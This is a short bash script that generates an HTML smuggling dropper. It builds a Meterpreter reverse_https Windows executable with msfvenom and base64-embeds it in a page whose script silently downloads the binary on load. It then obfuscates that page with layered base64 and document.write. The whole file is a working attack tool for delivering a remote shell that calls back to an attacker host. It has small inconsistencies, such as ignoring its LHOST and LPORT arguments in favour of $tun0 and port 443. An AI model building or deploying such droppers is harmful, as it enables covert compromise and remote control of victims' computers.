#!/bin/bash
if [ "$#" -lt 2 ] || [ "$#" -gt 4 ]; then
    echo "Usage: $0 <LHOST> <LPORT> [HTML_FILENAME] [BINARY_FILENAME]"
    exit 1
fi

LHOST=$1
LPORT=$2
HTML_FILENAME=${3:-payload.html}
BINARY_FILENAME=${4:-payload.exe}

echo "[+] Generating the payload with msfvenom"
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$tun0 LPORT=443 -f exe -o .payload.exe 2> /dev/null
base64_content=$(base64 -w 0 .payload.exe)
rm -f .payload.exe

echo "[+] Encoding the payload to base64"
html_content=$(cat <<EOF
<html>
<body>
<script>
function b64toArrBuf(b64) {
    var bs = atob(b64), l = bs.length, b = new Uint8Array(l);
    for (var i = 0; i < l; i++) b[i] = bs.charCodeAt(i);
    return b.buffer;
}
var f = '$base64_content', d = b64toArrBuf(f), b = new Blob([d], {type: 'octet/stream'}), fn = '$BINARY_FILENAME', a = document.createElement('a');
document.body.appendChild(a); a.style = 'display: none';
var u = window.URL.createObjectURL(b); a.href = u; a.download = fn; a.click();
window.URL.revokeObjectURL(u);
</script>
</body>
</html>
EOF
)

obfuscated_html=$(echo "$html_content" | base64 | sed 's/.*/document.write(atob("&"));/')

cat <<EOL > $HTML_FILENAME
<html>
<body>
<script>
$obfuscated_html
</script>
</body>
</html>
EOL

echo "[+] HTML file '$HTML_FILENAME' created successfully."
